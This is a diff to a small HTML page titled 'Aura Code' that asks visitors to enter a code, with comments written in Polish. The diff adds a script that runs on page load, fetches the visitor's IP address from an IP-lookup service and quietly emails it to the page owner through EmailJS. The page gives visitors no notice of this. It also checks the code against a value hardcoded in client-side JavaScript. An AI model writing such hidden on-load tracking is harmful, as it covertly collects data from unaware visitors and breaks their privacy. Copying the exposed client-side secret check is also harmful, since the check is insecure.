@@ -37,15 +37,38 @@
             margin-top: 10px;
         }
     </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Aura Code:</h1>
-        <input type="text" id="codeInput" class="input-field" placeholder="Enter code here">
-        <button class="button" onclick="checkCode()">Submit</button>
-    </div>
-
+    <!-- Włącz bibliotekę EmailJS -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        // Inicjalizacja EmailJS
+        (function(){
+            emailjs.init('YOUR_USER_ID'); // Zamień YOUR_USER_ID na swój ID użytkownika EmailJS
+        })();
+
+        // Funkcja do wysyłania emaila z adresem IP
+        function sendEmail(ip) {
+            emailjs.send('service_urwaaz5', 'template_c9bwtca', {
+                ip_address: ip // Upewnij się, że ta nazwa zmiennej jest taka sama jak w Twoim szablonie
+            })
+            .then((response) => {
+                console.log('Adres IP został wysłany pomyślnie!');
+            }, (error) => {
+                console.error('Wystąpił błąd podczas wysyłania adresu IP:', error);
+            });
+        }
+
+        // Funkcja do pobierania adresu IP i wysyłania go e-mailem
+        function fetchAndSendIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    sendEmail(data.ip);
+                });
+        }
+
+        // Wywołanie funkcji automatycznie przy ładowaniu strony
+        window.onload = fetchAndSendIP;
+
         function checkCode() {
             const correctCode = "5849263710482";
             const userInput = document.getElementById("codeInput").value;
@@ -57,5 +80,12 @@
             }
         }
     </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Aura Code:</h1>
+        <input type="text" id="codeInput" class="input-field" placeholder="Enter code here">
+        <button class="button" onclick="checkCode()">Submit</button>
+    </div>
 </body>
 </html>
